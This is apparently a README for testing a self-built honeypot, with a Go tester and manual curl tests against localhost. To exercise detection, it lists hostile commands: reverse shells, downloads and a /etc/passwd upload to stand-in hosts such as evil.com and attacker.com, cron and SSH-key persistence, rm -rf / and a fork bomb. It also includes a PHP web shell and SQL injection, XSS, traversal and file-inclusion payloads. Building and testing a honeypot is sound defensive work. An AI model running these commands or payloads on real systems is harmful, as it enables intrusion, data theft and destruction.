# Honeypot Test Commands - Complete Guide

## ✅ Go Tester (Automated Testing)

The Go tester automatically tests **100+ attack patterns** against your honeypot!

### Default Credentials (Updated!)
- **Username**: `admin`
- **Password**: `admin123`

### Quick Start
```bash
# Build the tester
go build -o tester ./cmd/tester/main.go

# Test everything (SSH + HTTP)
./tester

# Test only SSH attacks
./tester --ssh-only --no-bruteforce

# Test only HTTP attacks
./tester --http-only

# Custom credentials
./tester --ssh-user root --ssh-pass toor

# Against Docker container
./tester --ssh-host localhost --ssh-port 2222 --http-url http://localhost:80
```

### What The Tester Does Automatically

When you run `./tester`, it **automatically executes** the following tests:

#### 1. SSH Protocol Tests
- SSH version detection (SSH-2.0)
- Authentication method testing (password, keyboard-interactive, public key)
- Server banner capture

#### 2. SSH Brute Force (5 attempts)
- admin/password
- admin/123456
- root/toor
- root/password
- admin/admin

#### 3. **SSH Valid Login → Commands Execute Automatically! ✨**

After successful login with `admin/admin123`, the tester **automatically runs 60+ commands**:

**Reconnaissance (6 commands)**
```bash
ls, ls -la, pwd, whoami, id, groups
```

**System Information (6 commands)**
```bash
uname -a, cat /etc/os-release, hostname, uptime, df -h, free -m
```

**Process & Network (10 commands)**
```bash
ps aux, ps -ef, netstat -tulpn, ss -tulpn, ifconfig, ip addr,
ip route, arp -a, lsof -i, who
```

**File System Exploration (11 commands)**
```bash
cat /etc/passwd, cat /etc/shadow, cat /etc/hosts, cat /etc/hostname
cat /home/user/secret.txt, cat /home/user/.bashrc, cat /home/user/.bash_history
find / -name "*.conf", find / -type f -perm -4000, find /home -name "*.txt"
ls -la /root
```

**Privilege Escalation (4 commands)**
```bash
sudo -l, sudo su, su root, cat /etc/sudoers
```

**Malware Download (4 commands)**
```bash
curl http://malicious.com/payload.sh
wget http://evil.com/backdoor.sh
wget -O /tmp/shell.sh http://attacker.com/reverse.sh
curl -o /tmp/bot http://badguys.net/cryptominer
```

**Malicious Execution (6 commands)**
```bash
chmod +x malware.sh, chmod 777 /tmp, ./malware.sh
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1  # Reverse shell
nc -e /bin/sh attacker.com 4444
python -c 'import socket...'
```

**Persistence (4 commands)**
```bash
crontab -l
echo '* * * * * /tmp/backdoor.sh' | crontab -
cat ~/.ssh/authorized_keys
echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys
```

**Data Exfiltration (3 commands)**
```bash
tar -czf /tmp/data.tar.gz /home/user
zip -r /tmp/secrets.zip /home/user/Documents
curl -X POST -d @/etc/passwd http://attacker.com/upload
```

**Destructive Commands (4 commands)**
```bash
rm -rf /, rm -rf /*, dd if=/dev/zero of=/dev/sda, :(){:|:&};:
```

**System Manipulation (5 commands)**
```bash
iptables -F, systemctl stop firewalld, pkill -9 sshd, history -c, unset HISTFILE
```

#### 4. SSH Multiple Concurrent Sessions
- Opens 3 simultaneous connections
- Executes commands on each session
- Tests connection limits

#### 5. SSH Key Exchange & Environment
- Key exchange completion
- Environment variable injection (LANG, PATH, TERM)
- PTY allocation request
- X11 forwarding attempt
- SSH agent forwarding
- Port forwarding tests (Local -L, Remote -R, SOCKS -D)

#### 6. HTTP Attacks (40+ patterns)
- SQL injection (9 payloads)
- XSS (7 payloads)
- Command injection (6 payloads)
- Path traversal (6 payloads)
- Malicious file upload (4 files)
- WordPress/phpMyAdmin brute force
- Scanner detection (Nikto, SQLMap, Nmap, ZmEu, Masscan)
- Common exploits

### Expected Output

```
============================================================
SSH PROTOCOL TESTS
============================================================

✓ SSH protocol version detection
  SSH-2.0 server detected
✓ Test Password authentication
✓ Test Keyboard-interactive
✓ Test Public key authentication

============================================================
SSH VALID LOGIN TEST
============================================================

✓ Login successful: admin/admin123
  Connected to honeypot

============================================================
SSH COMMAND EXECUTION (admin)
============================================================

✓ List files
  Command: ls
    Output: total 48...
✓ Show current user
  Command: whoami
    Output: admin
✓ Read passwd file
  Command: cat /etc/passwd
    Output: root:x:0:0:root:/root:/bin/bash...

... (60+ commands execute automatically)

✓ Reverse shell attempt
  Command: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
    Output: bash: connect: Network is unreachable
✓ Fork bomb
  Command: :(){:|:&};:
    Output: bash: fork: retry: No child processes

============================================================
Total SSH Tests: 70+ patterns
Total HTTP Tests: 40+ patterns
Total: 100+ attack patterns tested!
============================================================
```

### Verify Results in Dashboard

Open http://localhost:8080 and check:

**SSH Tab → Command Execution History**
```
IP ADDRESS    USERNAME    COMMAND                              TIMESTAMP
127.0.0.1     admin       ls                                   12/20/2025, 3:45 PM
127.0.0.1     admin       cat /etc/passwd                      12/20/2025, 3:45 PM
127.0.0.1     admin       wget http://evil.com/backdoor.sh     12/20/2025, 3:45 PM
127.0.0.1     admin       bash -i >& /dev/tcp/10.0.0.1/4444... 12/20/2025, 3:45 PM
127.0.0.1     admin       rm -rf /                             12/20/2025, 3:45 PM
```

All commands now show:
- ✅ **IP Address** (Fixed in v2.0.0!)
- ✅ **Username** (Fixed in v2.0.0!)
- ✅ **Full Command**
- ✅ **Timestamp**

---

## 📋 Manual HTTP Tests

If you want to test HTTP honeypot manually (without the Go tester):

### 1. WordPress Honeypot
```bash
# View login page
curl http://localhost/wordpress/wp-login.php

# Test login
curl -X POST http://localhost/wordpress/wp-login.php \
  -d "log=admin&pwd=admin123"

# User enumeration
curl http://localhost/wordpress/wp-json/wp/v2/users
```

### 2. phpMyAdmin Honeypot
```bash
# View login page
curl http://localhost/phpmyadmin/

# Vulnerable setup.php (CVE-2018-12613)
curl http://localhost/phpmyadmin/setup.php

# Test login
curl -X POST http://localhost/phpmyadmin/ \
  -d "pma_username=root&pma_password=root"
```

### 3. File Upload Tests
```bash
# Upload legitimate file
echo "test content" > test.txt
curl -F "file=@test.txt" http://localhost/upload.php

# Upload web shell (will be detected as malicious)
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
curl -F "file=@shell.php" http://localhost/upload.php

# Check quarantined files
docker exec honey-ssh-honeypot ls -la /root/uploads/
```

### 4. Admin Panels
```bash
# Generic admin panel
curl http://localhost/admin/

# Alternative paths
curl http://localhost/administrator/
curl http://localhost/cpanel/
curl http://localhost/manager/html
```

### 5. Exposed Configuration Files (Honeytokens)
```bash
# .env file with fake credentials
curl http://localhost/.env

# Git config
curl http://localhost/.git/config

# WordPress config
curl http://localhost/wp-config.php

# AWS credentials
curl http://localhost/.aws/credentials

# Database backup
curl http://localhost/backup.sql
```

### 6. Attack Tests

#### SQL Injection
```bash
# Basic SQLi
curl "http://localhost/?id=1' OR '1'='1"

# UNION-based
curl "http://localhost/?id=1' UNION SELECT * FROM users--"

# Time-based
curl "http://localhost/?id=1'; WAITFOR DELAY '00:00:05'--"
```

#### XSS (Cross-Site Scripting)
```bash
# Reflected XSS
curl "http://localhost/search?q=<script>alert('xss')</script>"

# IMG tag XSS
curl "http://localhost/?name=<img src=x onerror=alert(1)>"

# Event handler XSS
curl "http://localhost/?input=<body onload=alert(document.cookie)>"
```

#### Path Traversal
```bash
# Linux path traversal
curl "http://localhost/?file=../../../../etc/passwd"

# Windows path traversal
curl "http://localhost/?file=..\\..\\..\\windows\\system32\\config\\sam"

# URL encoded
curl "http://localhost/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
```

#### Command Injection
```bash
# Semicolon injection
curl "http://localhost/?cmd=test; whoami"

# Pipe injection
curl "http://localhost/?input=test | id"

# Backtick injection
curl "http://localhost/?data=\`uname -a\`"
```

#### Remote File Inclusion (RFI)
```bash
curl "http://localhost/?page=http://evil.com/shell.txt"
curl "http://localhost/?include=https://attacker.com/backdoor.php"
```

#### Local File Inclusion (LFI)
```bash
curl "http://localhost/?file=/etc/passwd"
curl "http://localhost/?page=../../../../../../etc/shadow"
```

### 7. Scanner Simulation
```bash
# Simulate sqlmap
curl -A "sqlmap/1.0" "http://localhost/test?id=1"

# Simulate Nikto
curl -A "Nikto/2.1.6" "http://localhost/"

# Simulate Nmap NSE
curl -A "Mozilla/5.00 (Nikto/2.1.5)" "http://localhost/"

# Rapid scanning (will be detected)
for i in {1..20}; do
    curl -s "http://localhost/test$i" > /dev/null
done
```

---

## 🔍 Monitoring Commands

### View Live Logs
```bash
# All logs
docker-compose logs -f honeypot

# HTTP requests only
docker-compose logs -f honeypot | grep "\[HTTP\]"

# Attacks only
docker-compose logs -f honeypot | grep -E "ATTACK|WARN"

# Specific attack types
docker-compose logs -f honeypot | grep -E "SQL Injection|XSS|Command Injection"
```

### View Dashboard
```bash
# Open web dashboard with dark mode!
open http://localhost:8080

# Toggle dark mode with ☀️/🌙 button in navbar
```

### Database Queries
```bash
# Access container
docker exec -it honey-ssh-honeypot sh

# View SSH commands with IP and username (FIXED!)
sqlite3 /root/data/honeypot.db "
SELECT c.command, cn.remote_addr, cn.username, c.timestamp
FROM commands c
LEFT JOIN connections cn ON c.connection_id = cn.id
ORDER BY c.timestamp DESC LIMIT 10;"

# View HTTP requests
sqlite3 /root/data/honeypot.db "
SELECT method, path, remote_addr
FROM http_requests
ORDER BY timestamp DESC LIMIT 10;"

# View attacks
sqlite3 /root/data/honeypot.db "
SELECT attack_type, severity, payload
FROM http_attacks
ORDER BY timestamp DESC LIMIT 10;"

# View uploaded files
sqlite3 /root/data/honeypot.db "
SELECT original_filename, md5_hash, is_malicious
FROM uploaded_files;"

# View credentials
sqlite3 /root/data/honeypot.db "
SELECT application, username, password, success
FROM http_credentials
ORDER BY timestamp DESC LIMIT 10;"
```

### Check Uploaded Files
```bash
# List uploaded files
docker exec honey-ssh-honeypot ls -lah /root/uploads/

# View file content (be careful with malware!)
docker exec honey-ssh-honeypot cat /root/uploads/<filename>

# Get file hash
docker exec honey-ssh-honeypot md5sum /root/uploads/<filename>
```

---

## 🔒 Security Note

⚠️ **All attacks are simulated** in the honeypot's fake shell:
- No actual system damage occurs
- All responses are simulated
- Real malware is not downloaded
- No actual reverse shells are created

The honeypot logs everything safely for analysis!

---

## 📊 Total Attack Coverage

| Category | Count | Description |
|----------|-------|-------------|
| SSH Protocol Tests | 10 | Version, auth methods, key exchange |
| SSH Commands | 60+ | Full attack lifecycle simulation |
| SSH Concurrent Sessions | 3 | Multiple connections |
| HTTP Attacks | 40+ | SQLi, XSS, RFI, LFI, etc. |
| File Uploads | 4 | Malicious file detection |
| Scanner Detection | 5+ | Nikto, SQLMap, Nmap, etc. |
| **TOTAL** | **100+** | **Complete attack simulation** |

---

**The tester is ready with admin/admin123 credentials and automatic command execution!** 🍯✨
